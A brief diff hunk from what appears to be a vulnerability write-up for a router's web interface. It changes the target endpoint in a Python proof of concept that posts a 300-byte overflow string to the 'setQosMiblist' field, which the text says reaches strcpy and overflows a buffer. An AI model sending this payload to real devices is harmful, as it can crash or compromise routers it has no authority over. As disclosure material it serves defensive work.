@@ -27,7 +27,7 @@ p eaqul list, if list contains '\n', get into if ,finally call strcpy, cause buf
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/SetQosBand"
+url = "http://192.168.1.13/goform/SetNetControlList"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'setQosMiblist': payload})
